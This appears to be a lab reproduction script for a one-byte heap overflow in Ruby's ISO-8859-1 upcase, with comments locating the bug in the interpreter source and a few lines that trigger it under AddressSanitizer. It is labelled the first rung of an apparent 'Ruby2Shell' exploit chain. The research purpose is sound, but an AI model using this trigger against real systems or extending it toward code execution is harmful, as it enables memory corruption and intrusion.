# Ruby2Shell rung-1 reproduction: one-byte heap overflow in ISO-8859-1 upcase.
# CVE-2026-132825 / upstream fix ruby/ruby@d582f8f.
# Mechanism (verified from ruby-3.4.12 source):
#   string.c:7777  CASE_MAPPING_ADDITIONAL_LENGTH 20
#   string.c:7830  capa = remaining_source_len * 1 + 20
#   enc/iso_8859_1.c:267  loop guard `to < to_end` guarantees 1 byte, but
#   sharp s (0xDF) upcase writes two bytes ('S','S') at lines 272+293.
#   21 sharp-s input -> 42 output bytes into capa 41 -> byte at index 41
#   is written one past the end, value 0x53 'S'.
# Run: ASAN ruby lab/repro/ruby2shell-rung1.rb
s = "\xDF".b * 21
s.force_encoding(Encoding::ISO_8859_1)
t = s.upcase
print "upcase returned, out len=#{t.bytesize}\n"
